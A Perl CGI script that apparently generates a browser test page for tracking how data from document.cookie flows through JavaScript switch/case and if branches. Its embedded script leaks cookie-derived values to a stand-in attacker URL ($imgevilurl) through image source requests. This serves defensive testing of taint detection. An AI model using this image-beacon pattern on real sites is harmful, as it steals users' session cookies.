#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_CASE";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil
		
		var notevil = 1;
		switch(true) {
		  case (notevil == 1) :
			  notevil = 4;
			  break;
		}
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val
		
		var notevil2 = 1;
		if ($evil) {
			switch(true) {
			  case (notevil2 == 1) :
				notevil2 = 4;
				break;
			}
		}
		var url = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url;
		
		// normal usage
		
		notevil3 = 1;
		var evil = $evil != 0;
		switch(true) {
		  case (evil) :
			notevil3 = 4;
			break;
		}
		document.images[2].src = "$imgevilurl?isevil=" + notevil3;
		
    </script>
|;

require "xss_basic_footer.pl";
